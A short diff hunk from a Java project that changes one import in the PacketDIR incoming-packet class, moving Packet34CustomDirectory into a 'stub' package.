@@ -2,7 +2,7 @@ package com.redpois0n.packets.incoming;
 
 import com.redpois0n.Connection;
 import com.redpois0n.common.OperatingSystem;
-import com.redpois0n.packets.outgoing.Packet34CustomDirectory;
+import com.redpois0n.stub.packets.outgoing.Packet34CustomDirectory;
 
 public class PacketDIR extends AbstractIncomingPacket {
 
